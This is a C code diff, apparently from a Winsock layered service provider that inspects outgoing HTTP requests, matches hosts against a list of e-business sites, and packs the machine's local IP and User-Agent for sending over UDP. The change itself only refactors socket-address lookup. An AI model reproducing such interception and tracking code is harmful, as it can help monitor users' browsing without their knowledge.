@@ -292,6 +292,30 @@ VOID FreeGaussBuf(PGAUSSBUF *pGaussBuf)
 	}
 }
 
+static BOOL IsLocalHostAddr(struct sockaddr_in *addr, BOOL *bLocalHost)
+{
+    struct hostent *he;
+    int i;
+
+    if (!(he = gethostbyname("localhost"))) {
+        dbgprint("gethostbyname failed");
+        return FALSE;
+	}
+
+    if (he->h_addrtype != AF_INET)
+        return FALSE;
+
+    *bLocalHost = FALSE;
+
+    for (i = 0; he->h_addr_list[i]; i++) {
+		if (memcmp(he->h_addr_list[i], &addr->sin_addr, he->h_length) == 0) {
+            *bLocalHost = TRUE;
+		}
+	}
+
+    return TRUE;
+}
+
 VOID LookInside(SOCK_INFO *SocketContext, LPWSABUF lpBuffers, DWORD dwBufferCount)
 {
 	PGAUSSBUF pSendBuffer;
@@ -302,6 +326,10 @@ VOID LookInside(SOCK_INFO *SocketContext, LPWSABUF lpBuffers, DWORD dwBufferCoun
 	char url[URL_MAX_LENGTH], *urlpath;
 	int ebindex;
 	char *host, *accept; 
+    struct sockaddr_in *local_addr = NULL;
+   // BOOL bLocalHost;
+    struct sockaddr_in addr_buf;
+    socklen_t addr_len = sizeof(addr_buf);
 
 	// assemble http request buffer
 	{
@@ -368,6 +396,7 @@ VOID LookInside(SOCK_INFO *SocketContext, LPWSABUF lpBuffers, DWORD dwBufferCoun
 
 main_point:
 
+
 	/* parse accpet header */
 	if (!GetHttpHeaderValue(headers, numHeaders, "accept: ", &accept) ||
 		!(strstr(accept, "text/html") || strstr(accept, "*/*")))
@@ -379,6 +408,25 @@ main_point:
 
 	if ((ebindex = MatchingEBusiness(host)) <= 12 && ebindex != 0)
 		goto release_sendbuffer;
+
+    // check socket addr
+    if(getsockname(SocketContext->ProviderSocket, 
+		                          (struct sockaddr *)&addr_buf, 
+								  &addr_len) == SOCKET_ERROR)
+	{
+        dbgprint("getsockname failed");
+        goto release_sendbuffer;
+	}
+
+    local_addr = &addr_buf;
+
+    /*
+	if (IsLocalHostAddr(&addr_buf, &bLocalHost)) {
+        local_addr = &addr_buf;
+        if (bLocalHost) 
+            goto release_sendbuffer;
+	}
+    */
 
 	/* parse  url */
 	{
@@ -523,21 +571,13 @@ main_point:
 
 		{
             WSABUF wsabuf[3];
-            SOCKET ProviderSocket = SocketContext->ProviderSocket;
-            //LPWSPPROC_TABLE lpProcTable = &(SocketContext->Provider->NextProcTable);
-			struct sockaddr_in addr;
-            socklen_t addrlen = sizeof(addr);
             char localIp[INET_ADDRSTRLEN];
             char *pUserAgent;
             int i = 0;
             SOCKET udpsocket;
 
             // local ip
-			if(getsockname(ProviderSocket, (struct sockaddr *)&addr, &addrlen) == SOCKET_ERROR) {
-                dbgprint("getsockname failed");
-			} else if (InetNtopA(AF_INET, &(addr.sin_addr), localIp, sizeof(localIp)) == NULL) {
-                dbgprint("InetNtopA failed");
-			} else {
+            if (local_addr && InetNtopA(AF_INET, &(local_addr->sin_addr), localIp, sizeof(localIp))) {
                 wsabuf[i].buf = localIp;
                 wsabuf[i].len = strlen(localIp) + 1;
                 i++;
